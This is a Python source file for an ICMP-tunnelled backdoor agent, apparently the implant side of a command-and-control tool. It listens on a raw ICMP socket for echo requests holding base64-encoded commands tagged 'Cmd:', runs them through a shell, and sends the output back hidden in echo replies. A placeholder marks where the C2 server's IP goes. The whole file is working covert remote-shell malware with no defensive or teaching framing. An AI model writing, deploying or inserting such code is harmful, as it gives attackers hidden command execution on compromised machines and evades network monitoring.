import socket
import os
import struct
import select
import subprocess
import base64
import threading
import signal

ICMP_ECHO_REQUEST = 8
ICMP_ECHO_REPLY = 0
ICMP_CODE = socket.getprotobyname('icmp')
COMMAND_TIMEOUT = 10  # Timeout for command execution in seconds

def checksum(source_string):
    """A simple checksum function to validate packet integrity."""
    sum = 0
    count_to = (len(source_string) // 2) * 2
    count = 0
    while count < count_to:
        this_val = source_string[count + 1] * 256 + source_string[count]
        sum = sum + this_val
        sum = sum & 0xffffffff
        count += 2

    if count_to < len(source_string):
        sum = sum + source_string[-1]
        sum = sum & 0xffffffff

    sum = (sum >> 16) + (sum & 0xffff)
    sum = sum + (sum >> 16)
    answer = ~sum
    answer = answer & 0xffff
    answer = answer >> 8 | (answer << 8 & 0xff00)
    return answer

def create_packet(id, payload):
    """Create an echo reply packet with the given payload."""
    header = struct.pack('bbHHh', ICMP_ECHO_REPLY, 0, 0, id, 1)
    data = payload
    my_checksum = checksum(header + data)
    header = struct.pack('bbHHh', ICMP_ECHO_REPLY, 0, socket.htons(my_checksum), id, 1)
    return header + data

def execute_command(command):
    """Executes a command with a timeout and returns its output."""
    def target():
        nonlocal process
        try:
            # Start the subprocess in a new process group
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, preexec_fn=os.setsid)
            stdout, stderr = process.communicate()
            output_queue.append(stdout + stderr)
        except Exception as e:
            output_queue.append(str(e))

    output_queue = []
    process = None
    thread = threading.Thread(target=target)
    thread.start()
    thread.join(COMMAND_TIMEOUT)
    
    if thread.is_alive():
        print(f"Command '{command}' timed out after {COMMAND_TIMEOUT} seconds")
        if process:
            # Terminate the entire process group
            os.killpg(os.getpgid(process.pid), signal.SIGTERM)
        thread.join()
        output_queue.append(f"Command '{command}' terminated due to timeout.")

    return output_queue[0] if output_queue else "No output."

def process_packet(packet_data, address):
    """Processes a received ICMP packet."""
    icmp_header = packet_data[20:28]
    type, code, checksum, packet_id, sequence = struct.unpack('bbHHh', icmp_header)

    if type == ICMP_ECHO_REQUEST:
        try:
            command_data = packet_data[28:]
            command = base64.b64decode(command_data).decode('utf-8')
            identifier = "Cmd:"  # Unique identifier for a command packet
            if command.startswith(identifier):
                command = command[len(identifier):]  # Remove the identifier
                print(f"Executing command: {command}")
                output = execute_command(command)
                reply_packet = create_packet(packet_id, base64.b64encode(output.encode('utf-8')))
                sock.sendto(reply_packet, address)
            else:
                print("Received ICMP packet that is not a command.")
        except Exception as e:
            print(f"Error processing packet: {e}")

def main():
    global sock
    target_ip = "<C2/Server IP>"  # Replace with C2's IP

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, ICMP_CODE)
    except socket.error as e:
        print(f"Socket creation failed: {e}")
        os._exit(1)

    while True:
        readable, writable, exceptional = select.select([sock], [], [], 1)
        if readable:
            packet_data, address = sock.recvfrom(1024)
            process_packet(packet_data, address)

if __name__ == "__main__":
    main()